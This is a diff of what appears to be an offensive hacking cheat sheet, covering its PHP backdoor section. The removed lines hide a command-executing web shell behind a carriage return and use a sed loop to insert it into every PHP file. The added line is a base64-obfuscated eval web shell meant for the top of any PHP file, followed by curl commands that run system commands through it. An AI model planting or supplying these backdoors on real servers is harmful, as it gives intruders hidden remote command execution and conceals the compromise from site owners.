@@ -54,7 +54,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
-   1. [Hidden PHP backdoor](#carriage-return-backdoor) 
+   1. [Smallest PHP backdoor](#carriage-return-backdoor) 
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
@@ -234,7 +234,7 @@ ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prn
 <a id="cat"></a>
 **1.viii. Hide from cat**
 
-ANSI escape characters or a simple `\r` (carriage return) can be used to hide from `cat` and others.
+ANSI escape characters or a simple `\r` ([carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/)) can be used to hide from `cat` and others.
 
 Hide the last command (example: `id`) in `~/.bashrc`:
 ```sh
@@ -1079,15 +1079,13 @@ Other methods:
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
 <a id="carriage-return-backdoor"></a>
-**6.iv. Hidden PHP Backdoor**
+**6.iv. Smallest PHP Backdoor**
 
-Hide from `cat` with a [simple carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/): 
-```sh
-### The first line will be hidden from cat
-cd /var/www/html
-echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Test Script. All OK."; ?>' >test.php
+
+Add this line to the beginning of any PHP file:
+```php
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7ZWNobyBgJF9QT1NUWzBdYDtleGl0O30");eval($i);?>
 ```
-Note the `$'\r'`: It will move the cursor back and then overwrite with the following line.
 
 Test the backdoor:
 ```sh
@@ -1097,14 +1095,6 @@ cd /var/www/html && php -S 127.0.0.1:8080
 curl http://127.0.0.1:8080/test.php
 ### With executing a command
 curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
-```
-Alternatively add the backdoor ``<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>`` to the beginning of every existing PHP page:
-
-```sh
-for f in *.php; do
-   sed -i '1s/^/<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>\r/' "$f"
-   echo "Backdoored: '$f'"
-done
 ```
 
 ---
